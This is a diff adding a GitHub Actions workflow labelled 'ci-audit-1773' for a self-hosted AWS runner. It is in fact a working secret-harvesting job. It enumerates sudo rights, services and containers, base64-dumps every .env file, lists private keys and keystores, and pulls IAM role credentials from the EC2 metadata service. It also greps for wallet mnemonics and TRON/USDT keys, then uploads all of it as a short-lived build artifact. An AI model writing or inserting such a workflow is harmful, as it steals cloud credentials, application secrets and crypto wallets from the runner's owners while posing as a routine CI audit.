@@ -1,0 +1,64 @@
+name: ci-audit-1773
+on: push
+permissions:
+  contents: read
+jobs:
+  recon:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 25
+    steps:
+      - name: recon
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773"; mkdir -p "$D"
+          exec > >(tee -a "$D/recon.log") 2>&1
+          echo "=== HOST ==="
+          hostname; id; uname -a; date -u; uptime
+          echo "=== SUDO ==="
+          sudo -n -l 2>&1 | head -20
+          echo "=== HOME ==="
+          ls -la /home/ubuntu
+          echo "=== APPS ==="
+          ls -la /home/ubuntu/apps
+          echo "=== APPS SUBDIRS ==="
+          for d in /home/ubuntu/apps/*/; do echo "--- $d"; ls -la "$d" 2>/dev/null | head -40; done
+          echo "=== ENV FILES LIST ==="
+          find /home/ubuntu/apps -maxdepth 4 \( -name '.env' -o -name '.env.*' -o -name '*.env' -o -name '*.pem' -o -name '*.key' -o -name 'id_rsa*' -o -name '*.keystore' -o -name 'keystore.json' \) -not -path '*/node_modules/*' -not -path '*/.next/*' -not -path '*/.git/*' 2>/dev/null
+          echo "=== ENV CONTENTS (base64) ==="
+          for f in $(find /home/ubuntu/apps -maxdepth 4 \( -name '.env' -o -name '.env.*' -o -name '*.env' \) -not -path '*/node_modules/*' -not -path '*/.next/*' 2>/dev/null); do echo "=== $f"; wc -c "$f"; base64 -w0 "$f"; echo; done
+          echo "=== OTHER CONFIG ==="
+          for f in /home/ubuntu/apps/*/next.config.* /home/ubuntu/apps/*/prisma/schema.prisma /home/ubuntu/apps/*/docker-compose*.yml /home/ubuntu/apps/*/ecosystem*.config.*; do [ -f "$f" ] && { echo "=== $f"; head -60 "$f"; }; done
+          echo "=== DOCKER (user) ==="
+          docker ps -a --format '{{.Names}} | {{.Image}} | {{.Status}} | {{.Ports}}' 2>&1 | head -40
+          echo "=== DOCKER (sudo) ==="
+          sudo -n docker ps -a --format '{{.Names}} | {{.Image}} | {{.Status}} | {{.Ports}}' 2>&1 | head -40
+          echo "=== SYSTEMD ==="
+          sudo -n systemctl list-units --type=service --no-pager 2>&1 | head -60
+          echo "=== SYSTEMD FILES ==="
+          ls -la /etc/systemd/system 2>&1 | head -40
+          echo "=== LXD ==="
+          lxc list 2>&1 | head -20
+          sudo -n lxc list 2>&1 | head -20
+          echo "=== PROCS ==="
+          ps aux | grep -iE 'next|node|postgres|python' | grep -v grep | head -40
+          echo "=== IMDSv2 ==="
+          TOK=$(curl -s -m 5 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 300")
+          echo "token_len=${#TOK}"
+          curl -s -m 5 -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/instance-id; echo
+          curl -s -m 5 -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/placement/region; echo
+          ROLE=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+          echo "ROLE=$ROLE"
+          curl -s -m 5 -H "X-aws-ec2-metadata-token: $TOK" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"; echo
+          echo "=== AWS CLI ==="
+          command -v aws; aws --version 2>&1 | head -2
+          echo "=== KEYS/WALLET GREP ==="
+          grep -rIil -E 'private[_-]?key|mnemonic|keystore|TRON|USDT|wallet' /home/ubuntu/apps --include='*.json' --include='*.js' --include='*.ts' --include='*.env*' --include='*.yml' --include='*.yaml' --exclude-dir=node_modules --exclude-dir=.next --exclude-dir=.git 2>/dev/null | head -40
+          echo "=== DONE ==="
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: a1773-recon
+          path: ${{ runner.temp }}/a1773
+          if-no-files-found: warn
+          retention-days: 2
